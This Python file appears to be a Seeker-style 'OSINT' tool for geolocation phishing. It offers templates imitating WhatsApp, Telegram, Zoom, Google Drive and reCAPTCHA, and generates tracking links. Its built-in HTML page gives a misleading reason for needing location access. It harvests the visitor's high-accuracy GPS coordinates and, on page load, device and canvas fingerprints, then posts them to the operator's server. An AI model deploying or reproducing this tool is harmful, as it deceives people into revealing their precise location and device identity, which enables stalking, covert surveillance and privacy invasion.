"""
Seeker Integration for OSINT Tools
Simplified geolocation tool that creates social engineering templates
to collect precise location data and device fingerprinting information
"""

import os
import json
import secrets
from datetime import datetime
from flask import render_template_string

class SeekerTool:
    """Simplified Seeker integration for geolocation and device fingerprinting"""
    
    def __init__(self):
        self.templates_dir = "seeker_templates"
        self.sessions = {}  # Store active sessions
        
    def get_available_templates(self):
        """Get list of available phishing templates"""
        try:
            with open(f"{self.templates_dir}/templates.json", 'r') as f:
                data = json.load(f)
                return data.get('templates', [])
        except:
            # Fallback templates if file not found
            return [
                {"name": "Near You", "dir_name": "nearyou"},
                {"name": "Google Drive", "dir_name": "gdrive"},
                {"name": "WhatsApp", "dir_name": "whatsapp"},
                {"name": "Telegram", "dir_name": "telegram"},
                {"name": "reCAPTCHA", "dir_name": "captcha"},
                {"name": "WhatsApp Redirect", "dir_name": "whatsapp_redirect"},
                {"name": "Zoom", "dir_name": "zoom"}
            ]
    
    def create_session(self, template_name, session_name=None):
        """Create a new tracking session"""
        session_id = secrets.token_urlsafe(16)
        
        session_data = {
            'id': session_id,
            'template': template_name,
            'name': session_name or f"Session_{session_id[:8]}",
            'created_at': datetime.utcnow().isoformat(),
            'status': 'active',
            'visits': 0,
            'locations': [],
            'devices': []
        }
        
        self.sessions[session_id] = session_data
        return session_data
    
    def get_session_stats(self):
        """Get statistics about active sessions"""
        active_sessions = len([s for s in self.sessions.values() if s['status'] == 'active'])
        total_visits = sum(s['visits'] for s in self.sessions.values())
        total_locations = sum(len(s['locations']) for s in self.sessions.values())
        
        return {
            'active_sessions': active_sessions,
            'total_sessions': len(self.sessions),
            'total_visits': total_visits,
            'total_locations': total_locations,
            'recent_sessions': list(self.sessions.values())[-5:]
        }
    
    def record_visit(self, session_id, location_data, device_data):
        """Record a visit with location and device data"""
        if session_id in self.sessions:
            session = self.sessions[session_id]
            session['visits'] += 1
            
            # Add location data if provided
            if location_data:
                location_entry = {
                    'timestamp': datetime.utcnow().isoformat(),
                    'latitude': location_data.get('latitude'),
                    'longitude': location_data.get('longitude'),
                    'accuracy': location_data.get('accuracy'),
                    'altitude': location_data.get('altitude'),
                    'speed': location_data.get('speed'),
                    'heading': location_data.get('heading')
                }
                session['locations'].append(location_entry)
            
            # Add device data
            if device_data:
                device_entry = {
                    'timestamp': datetime.utcnow().isoformat(),
                    'user_agent': device_data.get('userAgent'),
                    'screen_resolution': device_data.get('screen'),
                    'timezone': device_data.get('timezone'),
                    'language': device_data.get('language'),
                    'platform': device_data.get('platform'),
                    'cpu_cores': device_data.get('cores'),
                    'memory': device_data.get('memory'),
                    'gpu': device_data.get('gpu'),
                    'ip_address': device_data.get('ip'),
                    'canvas_fingerprint': device_data.get('canvas'),
                    'webgl_fingerprint': device_data.get('webgl')
                }
                session['devices'].append(device_entry)
            
            return True
        return False
    
    def get_session(self, session_id):
        """Get session data by ID"""
        return self.sessions.get(session_id)
    
    def generate_tracking_link(self, session_id, template_name):
        """Generate a tracking link for the session"""
        base_url = os.getenv('REPLIT_DOMAINS', 'localhost:5000')
        if not base_url.startswith('http'):
            base_url = f"https://{base_url}"
        
        return f"{base_url}/seeker/track/{session_id}/{template_name}"
    
    def get_template_html(self, template_name):
        """Get the HTML content for a specific template"""
        template_path = f"{self.templates_dir}/{template_name}/index_temp.html"
        
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                return f.read()
        else:
            # Return a basic template if specific one not found
            return self.get_basic_template(template_name)
    
    def get_basic_template(self, template_name):
        """Generate a basic tracking template"""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Location Required</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .btn { background: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .btn:hover { background: #0056b3; }
        .info { color: #666; margin-top: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Location Access Required</h2>
        <p>This service requires access to your location to provide personalized content.</p>
        <button class="btn" onclick="getLocation()">Allow Location Access</button>
        <div class="info">
            <p>Your location data is used to enhance your experience and will be handled securely.</p>
        </div>
    </div>

    <script>
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, showError, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            alert("Geolocation is not supported by this browser.");
        }
    }

    function showPosition(position) {
        const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            heading: position.coords.heading
        };

        const deviceData = {
            userAgent: navigator.userAgent,
            screen: screen.width + "x" + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory,
            canvas: getCanvasFingerprint(),
            timestamp: new Date().toISOString()
        };

        // Send data to server
        fetch(window.location.href + '/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ location: locationData, device: deviceData })
        }).then(() => {
            document.querySelector('.container').innerHTML = '<h2>Thank you!</h2><p>Access granted successfully.</p>';
        });
    }

    function showError(error) {
        let message = "Unable to retrieve location: ";
        switch(error.code) {
            case error.PERMISSION_DENIED:
                message += "Location access denied by user.";
                break;
            case error.POSITION_UNAVAILABLE:
                message += "Location information is unavailable.";
                break;
            case error.TIMEOUT:
                message += "Location request timed out.";
                break;
            default:
                message += "An unknown error occurred.";
                break;
        }
        alert(message);
    }

    function getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillText("Canvas fingerprinting", 2, 2);
        return canvas.toDataURL();
    }

    // Auto-collect device info on page load
    window.onload = function() {
        const deviceData = {
            userAgent: navigator.userAgent,
            screen: screen.width + "x" + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory,
            canvas: getCanvasFingerprint(),
            timestamp: new Date().toISOString()
        };

        fetch(window.location.href + '/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: deviceData })
        });
    };
    </script>
</body>
</html>'''